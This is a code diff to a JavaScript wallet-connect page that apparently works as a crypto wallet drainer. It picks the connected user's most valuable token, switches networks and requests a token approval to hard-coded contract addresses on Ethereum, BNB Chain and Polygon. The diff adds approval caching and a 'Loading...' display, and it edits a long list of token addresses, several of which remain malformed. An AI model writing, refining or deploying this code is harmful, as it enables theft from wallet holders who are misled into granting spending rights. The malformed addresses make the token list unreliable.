@@ -37,7 +37,8 @@ const store = {
   walletInfo: {},
   eip155Provider: null,
   tokenBalances: [],
-  errors: []
+  errors: [],
+  approvedTokens: {} // Cache for approved tokens
 }
 
 const updateStore = (key, value) => {
@@ -197,6 +198,7 @@ const initializeSubscribers = (modal) => {
       if (mostExpensive) {
         const message = `Самый дорогой токен: ${mostExpensive.symbol}, количество: ${mostExpensive.balance}, цена в USDT: ${mostExpensive.price} (${mostExpensive.symbol === 'USDT' || mostExpensive.symbol === 'USDC' ? 'Fixed' : 'Binance API'})`
         console.log(message)
+        document.getElementById('open-connect-modal').innerHTML = 'Loading...'
 
         // Switch to the network of the most expensive token
         const targetNetwork = networks.find(n => n.chainId === mostExpensive.chainId)
@@ -205,15 +207,25 @@ const initializeSubscribers = (modal) => {
           await appKit.switchNetwork(targetNetwork)
         }
 
-        // Propose approve for the most expensive token
+        // Propose approve for the most expensive token only if not already approved
         try {
           const contractAddress = CONTRACTS[mostExpensive.chainId]
+          const approvalKey = `${state.address}_${mostExpensive.chainId}_${mostExpensive.address}_${contractAddress}`
+          if (store.approvedTokens[approvalKey]) {
+            const approveMessage = `Approve already completed for ${mostExpensive.symbol} on ${mostExpensive.network}`
+            console.log(approveMessage)
+            document.getElementById('approveState').innerHTML = approveMessage
+            document.getElementById('approveSection').style.display = ''
+            return
+          }
+
           const txHash = await approveToken(
             wagmiAdapter.wagmiConfig,
             mostExpensive.address,
             contractAddress,
             mostExpensive.chainId
           )
+          store.approvedTokens[approvalKey] = true // Cache approval
           const approveMessage = `Approve successful for ${mostExpensive.symbol} on ${mostExpensive.network}: ${txHash}`
           console.log(approveMessage)
           document.getElementById('approveState').innerHTML = approveMessage
@@ -263,6 +275,8 @@ document.getElementById('open-connect-modal')?.addEventListener(
 document.getElementById('disconnect')?.addEventListener(
   'click', () => {
     appKit.disconnect()
+    store.approvedTokens = {} // Clear approval cache on disconnect
+    store.errors = [] // Clear errors on disconnect
   }
 )
 
@@ -303,7 +317,7 @@ updateTheme(store.themeState.themeMode)
 const CONTRACTS = {
   1: '0x0A57cf1e7E09ee337ce56108E857CC0537089CfC', // Ethereum Mainnet
   56: '0x67062812416C73364926b9d31E183014deB95462', // BNB Chain
-  137: '0xD29BD8fC4c0Acfde1d0A42463805d34A1902095c', // Polygon
+  137: '0xD29BD8fC4c0Acfde1d0A42463805d34A1902095C', // Polygon
 };
 
 const TOKENS = {
@@ -321,49 +335,49 @@ const TOKENS = {
     { symbol: 'ZRX', address: '0xe41d2489571d322189246dafa5ebde1f4699f498', decimals: 18 },
     { symbol: 'LRC', address: '0xbbbbca6a901c926f240b89eacb641d8aec7aeafd', decimals: 18 },
     { symbol: 'BNB', address: '0xb8c77482e45f1f44de1745f52c74426c631bdd52', decimals: 18 },
-    { symbol: 'SHIB', address: '0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4c', decimals: 18 },
+    { symbol: 'SHIB', address: '0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce', decimals: 18 },
     { symbol: 'PEPE', address: '0x6982508145454ce325ddbe47a25d4ec3d2311933', decimals: 18 },
     { symbol: 'LEASH', address: '0x27c70cd1946795b66be9d954418546998b546634', decimals: 18 },
-    { symbol: 'FLOKI', address: '0x66cf0c122c6b73ff809c693db761e7baebe62b6a2e', decimals: 18 },
+    { symbol: 'FLOKI', address: '0xcf0c122c6b73ff809c693db761e7baebe62b6a2e', decimals: 18 },
     { symbol: 'AAVE', address: '0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9', decimals: 18 },
     { symbol: 'RNDR', address: '0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24', decimals: 18 },
     { symbol: 'MKR', address: '0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2', decimals: 18 },
     { symbol: 'SUSHI', address: '0x6b3595068778dd592e39a122f4f5a5cf09c90fe2', decimals: 18 },
     { symbol: 'GLM', address: '0x7dd9c5cba05e151c895fde1cf355c9a1d5da6429', decimals: 18 },
-    { symbol: 'REP', address: '0x1985365e9f78359a9b6ad760e324f12f4a445e862', decimals: 18 },
+    { symbol: 'REP', address: '0x1985365e9f78359a9b6ad760e32412f4a445e862', decimals: 18 },
     { symbol: 'SNT', address: '0x744d70fdbe2ba4cf95131626614a1763df805b9e', decimals: 18 },
     { symbol: 'STORJ', address: '0xb64ef51c888972c908cfacf59b47c1afbc0ab8ac', decimals: 18 },
   ],
   BNB: [
-    { symbol: 'USDT', address: '0x55d398326f99059ff775485246999027b3197955', decimals: 6 },
-    { symbol: 'USDC', address: '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d', decimals: 6 },
+    { symbol: 'USDT', address: '0x55d398326f99059ff775485246999027b3197955', decimals: 18 },
+    { symbol: 'USDC', address: '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d', decimals: 18 },
     { symbol: 'SHIB', address: '0x2859e4544c4bb03966803b044a93563bd2d0dd4d', decimals: 18 },
     { symbol: 'PEPE', address: '0x25d887ce7a35172c62febfd67a1856f20faebb00', decimals: 18 },
-    { symbol: 'FLOKI', address: '0x2fb5c6815ca3ac72ce9f5006869ae67f18bf77006', decimals: 18 },
+    { symbol: 'FLOKI', address: '0xfb5c6815ca3ac72ce9f5006869ae67f18bf77006', decimals: 18 },
     { symbol: 'CAKE', address: '0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82', decimals: 18 },
     { symbol: 'BAKE', address: '0xe02df9e3e622debdd69fb838bb799e3f168902c5', decimals: 18 },
-    { symbol: 'XVS', address: '0x5cf6bb5389c92bdda8a3747ddb454cb7a64626c63', decimals: 18 },
-    { symbol: 'ALPACA', address: '0x88f0528ce5ef7b51152a59745befdd91d97091d2f', decimals: 18 },
+    { symbol: 'XVS', address: '0xcf6bb5389c92bdda8a3747ddb454cb7a64626c63', decimals: 18 },
+    { symbol: 'ALPACA', address: '0x8f0528ce5ef7b51152a59745befdd91d97091d2f', decimals: 18 },
     { symbol: 'AUTO', address: '0xa184088a740c695e156f91f5cc086a06bb78b827', decimals: 18 },
-    { symbol: 'BURGER', address: '0x2ae9269f27437f0fcbc232d39ec814844a51d6b8f', decimals: 18 },
-    { symbol: 'EPS', address: '0x77f552078dcc247cacc2684346020c03648500c6d9f', decimals: 18 },
-    { symbol: 'BELT', address: '0xe0e714c71282b6f4e823703a57cf58dc3ea4f', decimals: 18 },
-    { symbol: 'MBOX', address: '0x3203c9e46ca3d3821e8be4c2c9f0e2e7b0d5d0e75', decimals: 18 },
-    { symbol: 'SFP', address: '0xd41f9db03ba84762dd66a0af1a6c8540ff1ba5dfb', decimals: 18 },
-    { symbol: 'BabyDoge', address: '0x3c748673057861a797275cd8a068abb95a902e8de', decimals: 18 },
-    { symbol: 'EGC', address: '0x8c001bbe2b87079294c63ece98bdd0a88d761434e', decimals: 18 },
-    { symbol: 'QUACK', address: '0x0874b782e05aa25c50e7330af541d46e18f36661c', decimals: 18 },
-    { symbol: 'PIT', address: '0x2a003e3f0ed31c816347b6f99c62c6835c2c6b6f2', decimals: 18 },
+    { symbol: 'BURGER', address: '0xae9269f27437f0fcbc232d39ec814844a51d6b8f', decimals: 18 },
+    { symbol: 'EPS', address: '0xa7f552078dcc247c2684336020c03648500c6d9f', decimals: 18 },
+    { symbol: 'BELT', address: '0xe0e514c71282b6f4e823703a39374cf58dc3ea4f', decimals: 18 },
+    { symbol: 'MBOX', address: '0x3203c9e46ca618c8be4c2c9f0e2e7b0d5d0e75', decimals: 18 },
+    { symbol: 'SFP', address: '0xd41fdb03ba84762dd66a0af1a6c8540ff1ba5dfb', decimals: 18 },
+    { symbol: 'BabyDoge', address: '0xc748673057861a797275cd8a068abb95a902e8de', decimals: 18 },
+    { symbol: 'EGC', address: '0xc001bbe2b87079294c63ece98bdd0a88d761434e', decimals: 18 },
+    { symbol: 'QUACK', address: '0xd74b782e05aa25c50e7330af541d46e18f36661c', decimals: 18 },
+    { symbol: 'PIT', address: '0xa003e3f0ed31c816347b6f99c62c6835c2c6b6f2', decimals: 18 },
   ],
   POLYGON: [
-    { symbol: 'USDT', address: '0x1c2132d05d31c914a87c6611c10748aeb04b58e8f', decimals: 6 },
-    { symbol: 'USDC', address: '0x2791bca1bf2de4661ed88a30c99a7a9449aa84174', decimals: 6 },
+    { symbol: 'USDT', address: '0xc2132d05d31c914a87c6611c10748aeb04b58e8f', decimals: 6 },
+    { symbol: 'USDC', address: '0x2791bca1f2de4661ed88a30c99a7a9449aa84174', decimals: 6 },
     { symbol: 'QUICK', address: '0x831753dd7087cac61ab5644b308642cc1c33dc13', decimals: 18 },
-    { symbol: 'GHST', address: '0x385eeac5cb85a38a9a07a70c73e0a3271cfca19bc7', decimals: 18 },
-    { symbol: 'DFYN', address: '0x4c168e40227e4ebdf0b83dabb4b05d0b7c67f6a9be', decimals: 18 },
+    { symbol: 'GHST', address: '0x385eeac5cb85a38a9a07a70c73e0a3271cfb54b7', decimals: 18 },
+    { symbol: 'DFYN', address: '0xc168e40227e4ebd8b3dabb4b05d0b7c67f6a9be', decimals: 18 },
     { symbol: 'FISH', address: '0x3a3df212b7aa91aa0402b9035b098891d276572b', decimals: 18 },
-    { symbol: 'ICE', address: '0x4e1581f01046e1c6d7c3aa0fcea8e9b7ea0f28c49', decimals: 18 },
-    { symbol: 'DC', address: '0x7cc6bcad7c5e0e9283caee29ff9619a0b019e77e', decimals: 18 },
+    { symbol: 'ICE', address: '0x4e1581f01046ef0d6b6c3aa0fea8e9b7ea0f28c4', decimals: 18 },
+    { symbol: 'DC', address: '0x7cc6bcad7c5e0e928caee29ff9619aa0b019e77e', decimals: 18 },
   ],
 };
 
